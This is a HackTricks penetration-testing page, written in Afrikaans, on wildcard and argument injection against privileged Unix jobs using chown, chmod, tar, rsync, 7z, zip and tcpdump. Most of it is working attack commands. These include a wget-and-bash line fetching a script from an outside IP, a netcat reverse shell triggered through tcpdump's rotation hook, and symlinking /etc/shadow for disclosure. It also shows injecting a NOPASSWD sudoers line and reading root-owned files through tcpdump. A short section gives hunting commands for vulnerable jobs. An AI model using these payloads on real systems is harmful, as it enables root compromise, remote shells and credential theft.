# Wildcards se ekstra truuks

{{#include ../../banners/hacktricks-training.md}}

> Wildcard (ook bekend as *glob*) **argument injection** gebeur wanneer ’n bevoorregte script ’n Unix-binary soos `tar`, `chown`, `rsync`, `zip`, `7z`, … met ’n ongekwoteerde wildcard soos `*` uitvoer.
> Omdat die shell die wildcard **voor** die uitvoering van die binary uitbrei, kan ’n aanvaller wat lêers in die werksgids kan skep, lêername vorm wat met `-` begin, sodat hulle as **opsies in plaas van data** geïnterpreteer word en effektief arbitrêre flags of selfs commands insmokkel.<sup>[[6]](#references)</sup>
> Hierdie bladsy versamel die nuttigste primitives, onlangse navorsing en moderne detections vir 2023-2025.

## chown / chmod

Jy kan die **eienaar/groep of permission bits van ’n reference file kopieer** deur die `--reference` flag te misbruik wanneer ’n opsieagtige lêernaam deur ’n wildcard uitgebrei word.<sup>[[6]](#references)[[8]](#references)[[9]](#references)</sup>
```bash
# attacker-controlled directory
touch -- .drf.php
chmod 777 -- .drf.php
touch -- "--reference=.drf.php"   # ← filename becomes an argument
```
Wanneer root later iets soos die volgende uitvoer:
```bash
chown -R alice:alice *.php
chmod -R 644 *.php
```
Die uitgebreide `--reference=.drf.php` ignoreer die eksplisiete eienaar/modus, wat veroorsaak dat ooreenstemmende lêers metadata van `.drf.php` oorneem (en, met die opstelling hierbo, dit skryfbaar vir die aanvaller maak).<sup>[[6]](#references)</sup>

*PoC & tool*: [`wildpwn`](https://github.com/localh0t/wildpwn) (gekombineerde aanval).<sup>[[7]](#references)</sup>
Sien ook die klassieke DefenseCode-artikel vir besonderhede.<sup>[[6]](#references)</sup>

---

## tar

### GNU tar

Voer arbitrêre opdragte uit deur GNU tar se **checkpoint**-funksie en checkpoint-aksies te misbruik.<sup>[[10]](#references)</sup>
```bash
# attacker-controlled directory
echo 'echo pwned > /tmp/pwn' > shell.sh
chmod +x shell.sh
touch -- "--checkpoint=1"
touch -- "--checkpoint-action=exec=sh shell.sh"
```
Sodra root byvoorbeeld `tar -czf /root/backup.tgz *` uitvoer, word `shell.sh` as root uitgevoer.<sup>[[10]](#references)</sup>

### bsdtar / macOS compressor override-waarskuwing

Die verstek-`tar` op onlangse macOS (gebaseer op `libarchive`) bied nie GNU tar se `--checkpoint`-interface nie, maar bsdtar dokumenteer **--use-compress-program** vir die seleksie van ’n eksterne kompressor.<sup>[[11]](#references)</sup>
```bash
# macOS example
touch -- "--use-compress-program=sh"
```
Wanneer ’n bevoorregte script `tar -cf backup.tar *` uitvoer, kies dit `sh` deur die slagoffer se `PATH`, en bsdtar begin dit as die compressor.<sup>[[11]](#references)</sup> Dit bewys option injection, maar is nie op sigself ’n betroubare arbitrary-command primitive nie: ’n wildcard-geskepte lêernaam kan nie `/` bevat nie, en bsdtar verskaf argiefdata eerder as ’n shell command wat deur die aanvaller gekies is. Code execution vereis ook ’n beheerbare executable wat deur `PATH` opgelos word, of ’n ander argumentkanaal wat ’n nuttige program kan benoem.

---

## rsync

`rsync` laat jou toe om die remote shell of die remote binary te override via command-line flags soos `-e` en `--rsync-path`.<sup>[[12]](#references)</sup>
```bash
# attacker-controlled directory
touch -- "-e sh shell.sh"        # -e <cmd> => use <cmd> instead of ssh
```
As root later die gids met `rsync -az * backup:/srv/` argiveer, kan die injected flag ’n shell deur die remote-shell-meganisme laat loop.<sup>[[7]](#references)[[12]](#references)</sup>

*PoC*: [`wildpwn`](https://github.com/localh0t/wildpwn) (`rsync` mode).

---

## 7-Zip / 7z / 7za

Selfs wanneer die bevoorregte script die wildcard *defensief* met `--` voorafgaan (om option parsing te stop), aanvaar die 7-Zip CLI **file list files** deur die filename met `@` vooraf te gaan. Deur dit met ’n symlink te kombineer, kan jy *willekeurige lêers eksfiltreer*.<sup>[[13]](#references)</sup>
```bash
# directory writable by low-priv user
cd /path/controlled
ln -s /etc/shadow   root.txt      # file we want to read
touch @root.txt                  # tells 7z to use root.txt as file list
```
Indien root iets soos die volgende uitvoer:
```bash
7za a /backup/`date +%F`.7z -t7z -snl -- *
```
7-Zip sal probeer om `root.txt` (→ `/etc/shadow`) as ’n lêerlys te lees en sal ophou, **terwyl die inhoud na stderr gedruk word**.<sup>[[13]](#references)</sup>

Dit oorleef `-- *` omdat die 7-Zip CLI uitdruklik beide gewone lêername en `@listfiles` as posisionele invoere aanvaar, dus word ’n letterlike lêernaam soos `@root.txt` steeds spesiaal hanteer.<sup>[[13]](#references)</sup>

---

## zip

Twee baie praktiese primitives bestaan wanneer ’n application gebruiker-beheerde lêername aan `zip` deurgee (hetsy via ’n wildcard of deur name te enumerereer sonder `--`).<sup>[[2]](#references)[[3]](#references)</sup>

- RCE via test hook: `-T` aktiveer “test archive” en `-TT <cmd>` vervang die tester met ’n arbitrêre program (lang vorm: `--unzip-command <cmd>`). As jy lêername kan injecteer wat met `-` begin, verdeel die flags oor afsonderlike lêername sodat short-options parsing werk.<sup>[[2]](#references)[[3]](#references)</sup>
```bash
# Attacker-controlled filenames (e.g., in an upload directory)
# 1) A file literally named: -T
# 2) A file named: -TT wget 10.10.14.17 -O s.sh; bash s.sh; echo x
# 3) Any benign file to include (e.g., data.pcap)
# When the privileged code runs: zip out.zip <files...>
# zip will execute: wget 10.10.14.17 -O s.sh; bash s.sh; echo x
```
Aantekeninge
- MOENIE ’n enkele lêernaam soos `'-T -TT <cmd>'` probeer nie — kort opsies word per karakter ontleed en dit sal misluk. Gebruik afsonderlike tokens soos aangedui.<sup>[[3]](#references)</sup>
- As skuinsstrepe deur die toepassing van lêername verwyder word, haal vanaf ’n kaal host/IP (standaardpad `/index.html`) en stoor plaaslik met `-O`, en voer dit dan uit.<sup>[[3]](#references)</sup>
- Jy kan parsing met `-sc` (wys verwerkte argv) of `-h2` (meer hulp) debug om te verstaan hoe jou tokens verbruik word.<sup>[[3]](#references)</sup>

Voorbeeld (plaaslike gedrag op zip 3.0).<sup>[[3]](#references)</sup>
```bash
zip test.zip -T '-TT wget 10.10.14.17/shell.sh' test.pcap    # fails to parse
zip test.zip -T '-TT wget 10.10.14.17 -O s.sh; bash s.sh' test.pcap  # runs wget + bash
```
- Data exfil/leak: Indien die weblaag `zip` se stdout/stderr teruggee (algemeen met naïewe wrappers), sal ingespuitte flags soos `--help` of foute van slegte opsies in die HTTP-response verskyn, wat command-line injection bevestig en help met die verfyning van payloads.<sup>[[3]](#references)</sup>

---

## Bykomende option-injection-kandidate

Wanneer ’n bevoorregte wrapper ’n skryfbare gids met ’n wildcard uitbrei, is hierdie gedokumenteerde option hooks die moeite werd om na te gaan.<sup>[[15]](#references)[[16]](#references)[[17]](#references)</sup>

| Binary | Flag to abuse | Effect |
| --- | --- | --- |
| `flock` | `-c <cmd>` | Gee ’n command-string aan ’n shell deur |
| `git`   | `-c core.sshCommand=<cmd>` | Gebruik `<cmd>` in plaas van SSH vir Git fetch/push |
| `scp`   | `-S <program>` | Gebruik ’n alternatiewe SSH-versoenbare connection program |

Hierdie primitives is nuttige kontroles buiten die klassieke *tar/rsync/zip*.

---

## Soek na kwesbare wrappers en jobs

Onlangse gevallestudies en detection guidance toon dat wildcard/argv injection nie meer net ’n **cron + tar**-probleem is nie.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup> Dieselfde bug class verskyn steeds in:

- webfeatures wat "alles as zip/tar aflaai" vanaf aanvaller-beheerde upload-gidse
- verskaffer-/toestel-debug shells wat ’n **tcpdump**-wrapper met aanvaller-beheerde filename/filter-velde blootstel
- backup- of rotation-jobs wat `tar`, `rsync`, `7z`, `zip`, `chown`, of `chmod` op skryfbare gidse uitvoer

Nuttige triage commands (die `pspy`-invocation gebruik sy gedokumenteerde process/file-event- en interval-flags).<sup>[[14]](#references)</sup>
```bash
# Hunt for interesting binaries fed with globs or positional user data
rg -n --hidden --follow \
'(tar|bsdtar|rsync|zip|7z|7za|chown|chmod|tcpdump).*(\*|\$@|\$\*)' \
/etc /opt /usr/local /srv 2>/dev/null

# Watch real argv during cron/systemd execution
pspy64 -pf -i 1000 | rg 'tar|rsync|zip|7z|tcpdump|chown|chmod'

# Sudoers rules that constrain one argument but still allow extra flags
sudo -l
rg -n 'tcpdump|zip|tar|rsync' /etc/sudoers /etc/sudoers.d 2>/dev/null
```
Vinnige heuristieke:

- `-- *` is ’n goeie oplossing vir baie GNU tools, maar **nie** vir `7z`/`7za` nie, omdat `@listfiles` afsonderlik geparse word.<sup>[[13]](#references)</sup>
- Vir `zip`, soek wrappers wat filenames wat direk deur die gebruiker beheer word, optel; short-option splitting (`-T` + `-TT <cmd>`) werk steeds selfs sonder ’n shell glob.<sup>[[2]](#references)[[3]](#references)</sup>
- Vir `tcpdump`, let veral op wrappers waarmee jy **output file names**, **rotation settings** of **capture-file replay**-argumente kan beheer.<sup>[[18]](#references)</sup>

---

## tcpdump rotation hooks (-G/-W/-z): RCE via argv injection in wrappers

Wanneer ’n restricted shell of vendor wrapper ’n `tcpdump`-command line bou deur gebruikerbeheerde velde (bv. ’n "file name"-parameter) aaneen te voeg sonder streng quoting/validasie, kan jy ekstra `tcpdump`-flags insmokkel. Die kombinasie van `-G` (time-based rotation), `-W` (limit number of files) en `-z <cmd>` (post-rotate command) lewer arbitrary command execution as the user running tcpdump (dikwels root op appliances).<sup>[[1]](#references)[[4]](#references)[[18]](#references)</sup>

Voorvereistes:

- Jy kan die `argv` wat aan `tcpdump` deurgegee word, beïnvloed (bv. via ’n wrapper soos `/debug/tcpdump --filter=... --file-name=<HERE>`).<sup>[[4]](#references)[[18]](#references)</sup>
- Die wrapper sanitise nie spasies of tokens wat met `-` begin in die file name-veld nie.<sup>[[4]](#references)</sup>

Klassieke PoC (voer ’n reverse shell script vanaf ’n writable path uit).<sup>[[4]](#references)[[18]](#references)</sup>
```sh
# Reverse shell payload saved on the device (e.g., USB, tmpfs)
cat > /mnt/disk1_1/rce.sh <<'EOF'
#!/bin/sh
rm -f /tmp/f; mknod /tmp/f p; cat /tmp/f|/bin/sh -i 2>&1|nc 192.0.2.10 4444 >/tmp/f
EOF
chmod +x /mnt/disk1_1/rce.sh

# Inject additional tcpdump flags via the unsafe "file name" field
/debug/tcpdump --filter="udp port 1234" \
--file-name="test -i any -W 1 -G 1 -z /mnt/disk1_1/rce.sh"

# On the attacker host
nc -6 -lvnp 4444 &
# Then send any packet that matches the BPF to force a rotation
printf x | nc -u -6 [victim_ipv6] 1234
```
Details:

- `-G 1` roteer elke sekonde, en `-W 1` stop ná een geroteerde lêer; die capture moet ’n ooreenstemmende packet ontvang voordat rotasie plaasvind.<sup>[[18]](#references)</sup>
- `-z <cmd>` voer die post-rotate command een keer per rotasie uit en gee die geslote savefile-pad as ’n argument deur; maak seker dat script/interpreter-argumenthantering met jou payload ooreenstem.<sup>[[18]](#references)</sup>

Variante sonder verwyderbare media:

- As jy enige ander primitive het om lêers te skryf (bv. ’n aparte command wrapper wat output redirection toelaat), plaas jou script in ’n bekende pad en aktiveer `-z /path/script.sh`; laat die script self `/bin/sh` aanroep indien nodig.<sup>[[18]](#references)</sup>
- As ’n vendor wrapper jou toelaat om die geroteerde pad te kies, oudit daardie padbeheer slegs in kombinasie met ’n post-rotate command wat sy savefile-argument interpreteer; padbeheer alleen voer nie lêerinhoud uit nie.<sup>[[18]](#references)</sup>

---

## sudoers: tcpdump met wildcards/additional args → arbitrêre write/read en root

Voorbeeld van ’n sudoers anti-patroon:<sup>[[3]](#references)</sup>
```text
(ALL : ALL) NOPASSWD: /usr/bin/tcpdump -c10 -w/var/cache/captures/*/<GUID-PATTERN> -F/var/cache/captures/filter.<GUID-PATTERN>
```
Die reël laat verskeie opsies beskikbaar in tcpdump se gedokumenteerde parser:<sup>[[3]](#references)[[18]](#references)</sup>
- Die `*` glob en permissiewe patrone beperk slegs die eerste `-w`-argument. `tcpdump` aanvaar verskeie `-w`-opsies; die laaste een geld.<sup>[[3]](#references)[[18]](#references)</sup>
- Die reël beperk nie ander opsies nie, dus word `-Z`, `-r`, `-V`, ens. toegelaat.<sup>[[3]](#references)[[18]](#references)</sup>

Die relevante boublokke word hieronder gedokumenteer.<sup>[[3]](#references)[[18]](#references)</sup>
- Oorskryf die bestemmingspad met ’n tweede `-w` (die eerste een voldoen slegs aan sudoers).<sup>[[3]](#references)[[18]](#references)</sup>
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ \
-w /dev/shm/out.pcap \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Path traversal binne die eerste `-w` om uit die beperkte boomstruktuur te ontsnap.<sup>[[3]](#references)</sup>
```bash
sudo tcpdump -c10 \
-w/var/cache/captures/a/../../../../dev/shm/out \
-F/var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Dwing uitvoer-eienaarskap af met `-Z root` (skep root-besitte lêers enige plek).<sup>[[3]](#references)[[18]](#references)</sup>
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
-w /dev/shm/root-owned \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Skryf van arbitrêre inhoud deur 'n vervaardigde PCAP via `-r` te herafspeel (byvoorbeeld om 'n sudoers-reël by te voeg).<sup>[[3]](#references)[[18]](#references)</sup>

<details>
<summary>Skep 'n PCAP wat die presiese ASCII-loonvrag bevat en skryf dit as root</summary>
```bash
# On attacker box: craft a UDP packet stream that carries the target line
printf '\n\nfritz ALL=(ALL:ALL) NOPASSWD: ALL\n' > sudoers
sudo tcpdump -w sudoers.pcap -c10 -i lo -A udp port 9001 &
cat sudoers | nc -u 127.0.0.1 9001; kill %1

# On victim (sudoers rule allows tcpdump as above)
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
-r sudoers.pcap -w /etc/sudoers.d/1111-aaaa \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Arbitrêre lêerlees/geheime leak met `-V <file>` (interpreteer ’n lys savefiles). Foutdiagnostiek eggo dikwels lyne, wat inhoud le ak.<sup>[[3]](#references)[[18]](#references)</sup>
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -V /root/root.txt \
-w /tmp/dummy \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
---

## References

- [1] [GTFOBins - tcpdump](https://gtfobins.github.io/gtfobins/tcpdump/)
- [2] [GTFOBins - zip](https://gtfobins.github.io/gtfobins/zip/)
- [3] [0xdf - HTB Dump: Zip-argument-inspuiting na RCE + tcpdump sudo-wanopstelling vir privesc](https://0xdf.gitlab.io/2025/11/04/htb-dump.html)
- [4] [FiberGateway GR241AG - Volledige Exploit Chain](https://r0ny.net/FiberGateway-GR241AG-Full-Exploit-Chain/)
- [5] [Elastic - Potensiële Shell via Wildcard-inspuiting bespeur](https://www.elastic.co/guide/en/security/current/prebuilt-rule-8-19-20-potential-shell-via-wildcard-injection-detected.html)
- [6] [Terug Na Die Toekoms: Unix Wildcards Amok (DefenseCode)](https://www.exploit-db.com/papers/33930)
- [7] [wildpwn](https://github.com/localh0t/wildpwn)
- [8] [GNU Coreutils `chown`-aanroep](https://www.gnu.org/software/coreutils/manual/html_node/chown-invocation.html)
- [9] [GNU Coreutils `chmod`-aanroep](https://www.gnu.org/software/coreutils/manual/html_node/chmod-invocation.html)
- [10] [GNU tar-kontrolepunte](https://www.gnu.org/software/tar/manual/html_section/checkpoints.html)
- [11] [bsdtar(1)-handleiding](https://man.freebsd.org/cgi/man.cgi?query=bsdtar&sektion=1)
- [12] [rsync(1)-handleiding](https://download.samba.org/pub/rsync/rsync.1)
- [13] [7-Zip-opdragreëlsintaksis](https://7-zip.opensource.jp/chm/cmdline/syntax.htm)
- [14] [pspy](https://github.com/DominicBreuker/pspy)
- [15] [flock(1)-handleiding](https://kernel.googlesource.com/pub/scm/utils/util-linux/util-linux/+/refs/tags/v2.41.1/sys-utils/flock.1.adoc)
- [16] [Git-konfigurasiedokumentasie](https://git-scm.com/docs/git-config)
- [17] [OpenBSD `scp`-handleiding](https://man.openbsd.org/scp)
- [18] [tcpdump(8)-handleiding](https://man7.org/linux/man-pages/man8/tcpdump.8.html)
{{#include ../../banners/hacktricks-training.md}}
